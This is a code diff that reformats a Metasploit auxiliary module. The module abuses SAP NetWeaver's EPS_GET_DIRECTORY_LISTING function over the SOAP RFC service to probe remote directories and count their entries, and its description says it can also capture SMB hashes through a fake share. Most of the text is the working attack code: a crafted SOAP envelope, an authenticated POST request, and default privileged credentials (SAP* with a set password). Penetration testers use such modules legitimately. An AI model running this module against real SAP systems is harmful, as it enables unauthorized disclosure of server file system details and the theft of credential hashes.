@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -30,12 +31,12 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name' => 'SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure',
-      'Description' => %q{
+      'Description' => %q(
           This module abuses the SAP NetWeaver EPS_GET_DIRECTORY_LISTING function, on the
         SAP SOAP RFC Service, to check for remote directory existence and get the number
         of entries on it. The module can also be used to capture SMB hashes by using a fake
         SMB share as DIR.
-      },
+      ),
       'References' =>
         [
           [ 'URL', 'http://labs.mwrinfosecurity.com' ]
@@ -48,15 +49,15 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
-      Opt::RPORT(8000),
-      OptString.new('CLIENT', [true, 'SAP Client', '001']),
-      OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
-      OptString.new('HttpPassword', [true, 'Password', '06071992']),
-      OptString.new('DIR',[true,'Directory path (e.g. /etc)','/etc'])
-    ], self.class)
+                       Opt::RPORT(8000),
+                       OptString.new('CLIENT', [true, 'SAP Client', '001']),
+                       OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
+                       OptString.new('HttpPassword', [true, 'Password', '06071992']),
+                       OptString.new('DIR', [true, 'Directory path (e.g. /etc)', '/etc'])
+                     ], self.class)
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     data = '<?xml version="1.0" encoding="utf-8" ?>'
     data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  '
     data << 'xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  '
@@ -70,30 +71,28 @@ class MetasploitModule < Msf::Auxiliary
     data << '</SOAP-ENV:Envelope>'
 
     begin
-      vprint_status("#{rhost}:#{rport} - Sending request to check #{datastore['DIR']}")
-      res = send_request_cgi({
-        'uri' => '/sap/bc/soap/rfc',
-        'method' => 'POST',
-        'data' => data,
-        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
-        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
-        'ctype' => 'text/xml; charset=UTF-8',
-        'headers' => {
-          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-        },
-        'vars_get' => {
-          'sap-client' => datastore['CLIENT'],
-          'sap-language' => 'EN'
-        }
-      })
-      if res and res.code == 200 and res.body =~ /EPS_GET_DIRECTORY_LISTING\.Response/ and res.body =~ /<FILE_COUNTER>(\d*)<\/FILE_COUNTER>/
-        file_count = $1
-        print_good("#{rhost}:#{rport} - #{file_count} files under #{datastore["DIR"]}")
-      else
-        vprint_error("#{rhost}:#{rport} - Error code: " + res.code.to_s) if res
-        vprint_error("#{rhost}:#{rport} - Error message: " + res.message.to_s) if res
-        vprint_error("#{rhost}:#{rport} - Error body: " + res.body.to_s) if res and res.body
-      end
+        vprint_status("#{rhost}:#{rport} - Sending request to check #{datastore['DIR']}")
+        res = send_request_cgi('uri' => '/sap/bc/soap/rfc',
+                               'method' => 'POST',
+                               'data' => data,
+                               'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
+                               'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
+                               'ctype' => 'text/xml; charset=UTF-8',
+                               'headers' => {
+                                 'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
+                               },
+                               'vars_get' => {
+                                 'sap-client' => datastore['CLIENT'],
+                                 'sap-language' => 'EN'
+                               })
+        if res && (res.code == 200) && res.body =~ /EPS_GET_DIRECTORY_LISTING\.Response/ && res.body =~ /<FILE_COUNTER>(\d*)<\/FILE_COUNTER>/
+          file_count = Regexp.last_match(1)
+          print_good("#{rhost}:#{rport} - #{file_count} files under #{datastore['DIR']}")
+        else
+          vprint_error("#{rhost}:#{rport} - Error code: " + res.code.to_s) if res
+          vprint_error("#{rhost}:#{rport} - Error message: " + res.message.to_s) if res
+          vprint_error("#{rhost}:#{rport} - Error body: " + res.body.to_s) if res && res.body
+        end
       rescue ::Rex::ConnectionError
         vprint_error("#{rhost}:#{rport} - Unable to connect")
         return
